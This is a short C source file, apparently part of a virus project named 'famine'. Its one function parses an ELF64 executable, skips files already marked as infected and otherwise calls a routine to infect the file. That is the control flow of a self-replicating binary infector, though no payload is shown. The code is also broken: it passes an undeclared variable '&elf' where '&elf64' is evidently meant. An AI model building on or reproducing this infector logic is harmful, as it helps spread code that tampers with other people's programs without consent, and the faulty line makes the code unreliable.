#include "famine.h"

void process_elf64(t_file *file)
{
	t_elf64 elf64;

	if (parse_elf64(file, &elf64))
		return ;

	if (is_elf64_infected(file, &elf))
		return ;

	infect_elf64(file, &elf64);
}
